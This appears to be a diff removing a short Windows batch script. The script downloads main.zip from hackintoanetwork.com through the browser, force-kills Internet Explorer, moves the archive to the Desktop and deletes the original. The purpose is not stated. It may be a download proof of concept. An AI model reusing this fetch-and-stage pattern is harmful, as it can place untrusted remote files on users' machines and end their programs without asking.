@@ -1,5 +1,0 @@
-start https://hackintoanetwork.com/main.zip
-timeout /t 3
-taskkill /f /im iexplore.exe
-copy C:\Users\user\Downloads\main.zip C:\Users\user\Desktop
-del C:\Users\user\Downloads\main.zip
